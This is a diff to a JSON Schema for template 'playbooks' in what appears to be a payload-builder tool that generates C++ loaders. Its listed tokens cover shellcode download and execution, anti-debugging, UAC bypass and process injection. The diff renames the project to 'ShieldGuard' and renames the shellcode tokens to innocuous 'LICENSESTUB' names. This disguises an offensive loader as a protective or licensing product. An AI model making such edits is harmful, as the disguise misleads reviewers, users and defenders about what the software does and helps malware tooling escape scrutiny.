@@ -1,8 +1,8 @@
 {
   "$schema": "https://json-schema.org/draft/2020-12/schema",
-  "$id": "https://washmachine.dev/schemas/playbook.schema.json",
-  "title": "Washmachine Playbook",
-  "description": "Schema for default.yaml and any other playbook file under Assets/. Loaded by Washmachine.Core/Services/PlaybookService.cs. The runtime validator (ValidateCatalogShape) enforces the same shape — keep both in sync. Editors with a YAML extension that supports JSON Schema (e.g. VS Code yaml-language-server) can use this for autocomplete and inline error reporting.",
+  "$id": "https://shieldguard.dev/schemas/playbook.schema.json",
+  "title": "ShieldGuard Playbook",
+  "description": "Schema for default.yaml and any other playbook file under Assets/. Loaded by ShieldGuard.Core/Services/PlaybookService.cs. The runtime validator (ValidateCatalogShape) enforces the same shape — keep both in sync. Editors with a YAML extension that supports JSON Schema (e.g. VS Code yaml-language-server) can use this for autocomplete and inline error reporting.",
   "type": "object",
   "additionalProperties": false,
   "required": ["sections"],
@@ -94,7 +94,7 @@
         },
         "requires": {
           "type": "array",
-          "description": "Capability tokens that must also be selected for this item to compile. Each token must match an entry in KnownRequiresTokens.Map (Washmachine.Core/Models/KnownRequiresTokens.cs). Unknown tokens are a hard error at catalog load — currently only 'uac_bypass' is wired.",
+          "description": "Capability tokens that must also be selected for this item to compile. Each token must match an entry in KnownRequiresTokens.Map (ShieldGuard.Core/Models/KnownRequiresTokens.cs). Unknown tokens are a hard error at catalog load — currently only 'uac_bypass' is wired.",
           "items": { "type": "string", "minLength": 1 },
           "uniqueItems": true
         }
@@ -148,7 +148,7 @@
         },
         "content": {
           "type": "string",
-          "description": "C++ source with {{TOKEN}} placeholders. Standard system tokens: PREAMBLE, SNIPPET_INCLUDES, SNIPPET_IMPLEMENTATIONS, PROCESS_LOOKUP_HELPER, SHELLCODE_SOURCE, SHELLCODE_URL, GUARDRAILS, ANTI_DEBUGGING, UAC_BYPASS, PROCESS_INJECTION, SHELLCODE_EXECUTION."
+          "description": "C++ source with {{TOKEN}} placeholders. Standard system tokens: PREAMBLE, SNIPPET_INCLUDES, SNIPPET_IMPLEMENTATIONS, PROCESS_LOOKUP_HELPER, LICENSESTUB_SOURCE, LICENSESTUB_URL, GUARDRAILS, ANTI_DEBUGGING, UAC_BYPASS, PROCESS_INJECTION, LICENSESTUB_EXECUTION."
         },
         "placeholders": {
           "type": "array",
